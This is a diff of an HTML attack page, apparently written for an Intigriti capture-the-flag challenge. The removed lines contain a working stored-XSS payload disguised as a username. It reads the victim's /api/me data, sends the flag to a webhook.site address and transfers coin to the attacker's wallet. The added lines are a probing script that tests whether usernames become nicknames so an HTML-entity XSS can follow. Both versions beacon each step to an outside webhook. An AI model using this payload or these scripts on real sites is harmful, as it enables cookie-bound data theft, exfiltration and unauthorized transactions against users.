@@ -1,98 +1,85 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Test</title>
+    <title>Test Username → Nickname Theory</title>
     <meta charset="UTF-8">
     <style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;} h1{color:#0f0;text-align:center;} #log{background:#111;padding:15px;border:1px solid #333;margin:20px 0;font-size:11px;max-height:400px;overflow-y:auto;} .success{color:#0f0;} .error{color:#f00;} .info{color:#0ff;} .warning{color:#ff0;}</style>
 </head>
 <body>
-    <h1>XSS Test - Username as Nickname</h1>
+    <h1>Test: Username → Nickname</h1>
     <div id="log"></div>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
-        const WEBHOOK = 'https://webhook.site/d87d2d91-53b8-4517-be2b-3ad069e7ab34';
+        const WEBHOOK = 'https://webhook.site/2c5d8307-5b22-4ffe-af23-142d2c0768fb';
 
-        const XSS_USERNAME = `xss_test_${Date.now()}&lt;img src=x onerror=&quot;
-            (async () => {
-                const meResp = await fetch('/api/me', {credentials: 'include'});
-                const meData = await meResp.json();
-                await fetch('${WEBHOOK}', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        timestamp: new Date().toISOString(),
-                        flag: meData.flag,
-                        source: 'username_nickname_xss'
-                    })
-                });
-                await fetch('/api/transaction', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    credentials: 'include',
-                    body: JSON.stringify({
-                        toAddress: '${OUR_WALLET}',
-                        currency: '1337COIN',
-                        amount: 1
-                    })
-                });
-                alert('gigawatz - Flag: ' + (meData.flag || 'stolen'));
-            })();
-        &quot;&gt;`;
+        // Simple test username (no XSS)
+        const TEST_USERNAME = `testuser_${Date.now()}`;
 
         let step = 0;
 
-        function log(msg, type = 'info') {
+        function log(msg, type = 'info', data = {}) {
             step++;
             const ts = new Date().toLocaleTimeString();
-            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg}</div>`;
-            console.log(`[${step}] ${msg}`);
-
-            new Image().src = `${WEBHOOK}/?step=${step}&msg=${encodeURIComponent(msg)}&type=${type}&ts=${Date.now()}`;
+            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg} ${JSON.stringify(data)}</div>`;
+            console.log(`[${step}] ${msg}`, data);
+            new Image().src = `${WEBHOOK}/?step=${step}&msg=${encodeURIComponent(msg)}&data=${encodeURIComponent(JSON.stringify(data))}&type=${type}&ts=${Date.now()}`;
         }
 
-        async function exploit() {
+        async function test() {
             try {
-                log('Step 1: Registering with XSS username...');
+                log('TEST: Does username become nickname?', 'info');
+
+                // Step 1: Register with simple username
+                log('Step 1: Registering...', 'info', { username: TEST_USERNAME });
 
                 const regResp = await fetch(TARGET + '/api/register', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        username: XSS_USERNAME,
+                        username: TEST_USERNAME,
                         password: 'TestPass123!'
                     })
                 });
 
                 const regData = await regResp.json();
-                log(`Registration: ${regResp.status} - ${JSON.stringify(regData)}`, regResp.ok ? 'success' : 'error');
+                log('Registration result', regResp.ok ? 'success' : 'error', { status: regResp.status, data: regData });
 
                 if (!regResp.ok) {
-                    log('Registration failed - trying login only', 'warning');
+                    log('Registration failed, trying login only...', 'warning');
                 }
 
-                log('Step 2: Logging in with XSS user...');
+                // Step 2: Login
+                log('Step 2: Logging in...', 'info');
 
                 const loginResp = await fetch(TARGET + '/api/login', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     credentials: 'include',
                     body: JSON.stringify({
-                        username: XSS_USERNAME,
+                        username: TEST_USERNAME,
                         password: 'TestPass123!'
                     })
                 });
 
                 const loginData = await loginResp.json();
-                log(`Login: ${loginResp.status} - ${JSON.stringify(loginData)}`, loginResp.ok ? 'success' : 'error');
+                log('Login result', loginResp.ok ? 'success' : 'error', { status: loginResp.status, data: loginData });
 
                 if (!loginResp.ok) {
                     log('Login failed!', 'error');
                     return;
                 }
 
-                log('Step 3: Making transaction (will have our username as nickname)...');
+                // Step 3: Check /api/me to see our user data
+                log('Step 3: Checking /api/me...', 'info');
+
+                const meResp = await fetch(TARGET + '/api/me', { credentials: 'include' });
+                const meData = await meResp.json();
+                log('User data', 'info', { user: meData });
+
+                // Step 4: Make transaction
+                log('Step 4: Making transaction...', 'info');
 
                 const txResp = await fetch(TARGET + '/api/transaction', {
                     method: 'POST',
@@ -106,24 +93,45 @@
                 });
 
                 const txData = await txResp.json();
-                log(`Transaction: ${txResp.status} - ${JSON.stringify(txData)}`, txResp.ok ? 'success' : 'error');
+                log('Transaction result', txResp.ok ? 'success' : 'error', { status: txResp.status, data: txData });
 
-                log('Step 4: Redirecting admin to marketwatch...', 'warning');
-                log('XSS should execute when admin views our transaction!', 'warning');
+                // Step 5: Check marketwatch for our transaction
+                log('Step 5: Checking marketwatch...', 'info');
 
-                // Redirect to marketwatch after 2 seconds
+                await new Promise(r => setTimeout(r, 2000));
+
+                const mwResp = await fetch(TARGET + '/api/marketwatch', { credentials: 'include' });
+                const mwData = await mwResp.json();
+
+                // Find our transaction
+                const ourTx = mwData.find(tx => tx.nickname === TEST_USERNAME);
+                log('Marketwatch check', ourTx ? 'success' : 'warning', {
+                    found: !!ourTx,
+                    nickname: ourTx ? ourTx.nickname : 'not found',
+                    all_nicknames: mwData.map(tx => tx.nickname)
+                });
+
+                if (ourTx) {
+                    log('SUCCESS! Username becomes nickname! XSS should work with HTML entities!', 'success');
+                    log('Next: Try HTML entity XSS payload in username', 'warning');
+                } else {
+                    log('Username NOT in nickname. Need different approach.', 'error');
+                }
+
+                // Redirect to marketwatch to visually verify
                 setTimeout(() => {
+                    log('Redirecting to marketwatch.html...', 'info');
                     window.location.href = TARGET + '/marketwatch.html';
-                }, 2000);
+                }, 3000);
 
             } catch (error) {
-                log(`ERROR: ${error.message}`, 'error');
+                log('ERROR', 'error', { error: error.message, stack: error.stack });
             }
         }
 
         window.addEventListener('load', () => {
-            log('Page loaded, starting exploit...', 'info');
-            setTimeout(exploit, 500);
+            log('Starting test...', 'info');
+            setTimeout(test, 500);
         });
     </script>
 </body>
